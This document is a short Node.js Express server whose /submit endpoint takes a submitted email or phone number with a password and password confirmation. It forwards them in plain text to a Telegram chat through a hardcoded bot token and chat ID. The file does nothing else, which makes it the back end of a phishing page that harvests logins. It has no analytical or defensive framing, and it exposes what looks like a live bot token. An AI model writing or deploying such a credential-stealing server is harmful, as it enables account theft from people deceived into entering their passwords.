const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

const TELEGRAM_BOT_TOKEN = "7680942195:AAEfRFfgfcJXPAAlWu8W9Qq21Bpuv75JxsM";
const TELEGRAM_CHAT_ID = "7074446840";
app.get("/", (req, res) => {res.send("Server is running");});
app.post("/submit", async (req, res) => {
  try {
    // expect either email or phone along with passwords
    const { identifier, password, confirmPassword } = req.body;

    const text = `
📩 New Login/Signup Submission
━━━━━━━━━━━━━━
🆔 Identifier: ${identifier || "N/A"}
🔒 Password: ${password || "N/A"}
🔒 Confirm: ${confirmPassword || "N/A"}
━━━━━━━━━━━━━━
`;

    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        chat_id: TELEGRAM_CHAT_ID,
        text,
      }
    );

    res.json({ success: true });
  } catch (error) {
    console.error(error);
    res.status(500).json({ success: false });
  }
});

app.listen(3000, () => {
  console.log("Server running on port 3000");
});
